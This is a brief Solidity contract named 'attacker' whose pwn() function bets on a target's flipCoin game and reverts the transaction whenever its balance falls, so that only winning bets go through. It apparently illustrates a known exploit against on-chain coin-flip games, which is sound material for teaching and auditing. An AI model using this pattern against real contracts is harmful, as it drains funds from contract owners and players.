contract attacker {
  function pwn() public payable {
    uint balanceBefore = address(this).balance;
    YourContract.flipCoin{value: msg.value}(msg.value); 
    
    if(address(this).balance < balanceBefore) {
      revert();
    }
  }
}
